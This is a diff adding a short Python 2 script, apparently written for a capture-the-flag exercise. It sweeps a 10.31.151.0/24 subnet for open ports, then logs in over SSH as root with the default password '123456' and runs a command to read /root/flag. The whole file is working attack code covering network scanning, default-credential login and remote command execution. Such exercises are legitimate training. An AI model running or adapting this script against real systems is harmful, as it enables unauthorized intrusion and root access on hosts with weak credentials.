@@ -1,0 +1,38 @@
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+import socket
+for c in range(1,255,1):
+    ip = '10.31.151.' + str(c)
+    for port in range(1,80,1):
+        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sk.settimeout(0.01)
+        print "scannin port: %d" % port
+        try:
+            sk.connect((ip,port))
+            print 'Server %s port %d OK' % (ip,port)
+            if port == 22:
+                print "Connect to " + str(ip)+" and get FLAG!!!"
+                import paramiko
+                def sshclient_execmd(hostname, port, username, password, execmd):
+                    paramiko.util.log_to_file("paramiko.log")
+                    s = paramiko.SSHClient()
+                    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    s.connect(hostname=hostname, port=port, username=username, password=password)
+                    stdin, stdout, stderr = s.exec_command(execmd)
+                    stdin.write("Y")
+                    print stdout.read()
+                    s.close()
+                def main():
+                    hostname = ip
+                    port = 22
+                    username = 'root'
+                    password = '123456'
+                    execmd = "cat /root/flag"
+                    sshclient_execmd(hostname, port, username, password, execmd)
+                if __name__ == "__main__":
+                    main()
+                exit(0)
+        except Exception:
+            print 'Server %s port %d is not connected!' % (ip,port)
+    sk.close()
+c = c + 1
